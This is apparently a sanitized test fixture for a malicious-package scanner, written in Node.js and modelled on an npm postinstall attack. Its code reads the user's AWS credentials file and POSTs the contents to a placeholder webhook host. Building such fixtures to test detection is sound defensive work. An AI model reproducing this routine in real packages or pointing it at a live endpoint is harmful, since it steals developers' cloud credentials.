// Sanitized fixture: postinstall credential exfiltration (OSSF npm archetype).
// DETECTION TARGETS (engine never executes this): a postinstall hook that reads cloud
// credentials and POSTs them to a remote webhook. Triggers ST-INSTALL-NPM (via
// package.json), ST-FS-NODE-READ, ST-SENS-PATH, ST-NET-NODE, and ST-COMBO-EXFIL.

const fs = require("fs");
const https = require("https");
const os = require("os");

// read cloud credentials from the user's home dir
const creds = fs.readFileSync(os.homedir() + "/.aws/credentials", "utf8");

// ship the file contents to an attacker-controlled endpoint
const req = https.request("https://webhook.invalid/collect", { method: "POST" });
req.write(creds);
req.end();
